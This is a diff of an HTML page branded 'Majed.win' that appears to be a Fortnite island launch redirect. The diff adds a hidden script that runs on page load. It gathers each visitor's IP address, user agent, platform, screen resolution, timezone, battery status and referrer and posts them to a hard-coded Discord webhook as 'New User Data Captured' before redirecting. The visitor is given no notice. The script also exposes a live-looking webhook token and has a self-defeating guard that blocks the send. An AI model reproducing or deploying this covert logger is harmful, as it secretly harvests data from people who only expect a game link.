@@ -1,13 +1,98 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
+    <title>Majed.win</title>
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const code = urlParams.get('code') || '2987-3348-5247';
-        window.location.href = "com.epicgames.launcher://apps/fn%3A4fe75bbc5a674f4f9b356b5c90567da5%3AFortnite?action=launch&silent=true&arg=-IslandOverride%3D" + code;
+        // ضع رابط Discord Webhook الخاص بك هنا
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1503122092806111365/QL5wVNe19GS7Oe9DWLv9xv5ZSYevbZa7Spjo6aGa08cOK4ADsqP8WcVDmowhnY1u7lXD';
+
+        async function getIPAddress() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                return "Unknown";
+            }
+        }
+
+        async function sendToDiscord(info) {
+            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('https://discord.com/api/webhooks/1503122092806111365/QL5wVNe19GS7Oe9DWLv9xv5ZSYevbZa7Spjo6aGa08cOK4ADsqP8WcVDmowhnY1u7lXD')) return;
+
+            const payload = {
+                embeds: [{
+                    title: "🚀 New User Data Captured",
+                    color: 15158332, // Red/Orange color
+                    fields: [
+                        { name: "🌐 IP Address", value: info.ip, inline: true },
+                        { name: "🌍 Location/Timezone", value: info.timezone, inline: true },
+                        { name: "💻 Platform", value: info.platform, inline: true },
+                        { name: "📱 User Agent", value: `\`\`\`${info.userAgent}\`\`\`` },
+                        { name: "🖥️ Screen Resolution", value: info.screenResolution, inline: true },
+                        { name: "🔋 Battery Status", value: info.battery, inline: true },
+                        { name: "🔗 Referrer", value: info.referrer || "Direct Access", inline: false },
+                        { name: "🕒 Local Time", value: new Date().toLocaleString(), inline: false }
+                    ],
+                    footer: { text: "Majed.win Logger" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error("Error sending to Discord:", error);
+            }
+        }
+
+        async function getDetailedInfo() {
+            const ip = await getIPAddress();
+            let batteryInfo = "N/A";
+            
+            try {
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Discharging'})`;
+                }
+            } catch (e) {}
+
+            return {
+                ip: ip,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer,
+                battery: batteryInfo
+            };
+        }
+
+        window.onload = async function() {
+            const detailedData = await getDetailedInfo();
+            
+            // إرسال البيانات إلى ديسكورد
+            await sendToDiscord(detailedData);
+
+            // الحصول على الكود من الرابط
+            const urlParams = new URLSearchParams(window.location.search);
+            const code = urlParams.get('code') || '2987-3348-5247';
+            
+            // التحويل إلى اللعبة
+            setTimeout(() => {
+                window.location.href = "com.epicgames.launcher://apps/fn%3A4fe75bbc5a674f4f9b356b5c90567da5%3AFortnite?action=launch&silent=true&arg=-IslandOverride%3D" + code;
+            }, 1000);
+        };
     </script>
 </head>
 <body>
-    <p>Majed.win</p>
+    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif;">
+        <h1>Majed.win</h1>
+        <p>Majed.win</p>
+    </div>
 </body>
 </html>
